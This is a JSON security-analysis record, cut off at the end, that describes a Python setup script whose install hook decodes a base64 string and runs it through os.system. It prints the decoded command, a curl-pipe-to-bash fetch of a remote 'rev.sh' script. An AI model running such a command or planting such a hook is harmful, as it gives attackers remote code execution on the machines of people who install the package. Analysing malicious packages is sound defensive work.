{
  "purpose": "This script sets up a Python package with custom install and develop commands that execute a potentially malicious command during installation.",
  "sources": "The function b64d decodes a base64-encoded string, which contains a shell command; this function is called within notmalfunc() during installation. The command reads input from a base64-encoded string.",
  "sinks": "os.system() executes the decoded command, which potentially runs malicious code or connects to a remote server.",
  "flows": "The base64-encoded string is decoded by b64d, then passed to os.system(), executing the command during the install process.",
  "anomalies": "The code uses base64 encoding and decoding to obfuscate a system command, which is a common obfuscation technique for malicious payloads. The command appears to connect to a remote server ('http://192.168.1.3:8000/rev.sh') via curl, suggesting a potential remote code execution or backdoor setup.",
  "analysis": "The script defines functions for base64 decoding and executing system commands. During the installation process, the notmalfunc() function is called, which executes a shell command decoded from base64. The encoded command is: 'curl -s http://192.168.1.3:8000/rev.sh | bash', which downloads and executes a script from a remote server. This behavior indicates an attempt to run external code during package installation, which could be malicious. The use of base64 encoding to hide this activity further suggests malicious intent. The rest of the setup code appears standard, with no other suspicious components.",
  "conclusion": "The code contains a malicious backdoor that fetches and executes a remote script during package installation. The use of obfuscation and the execution of remote code strongly indicate malicious intent. This package is highly dangerous and should not be used.",
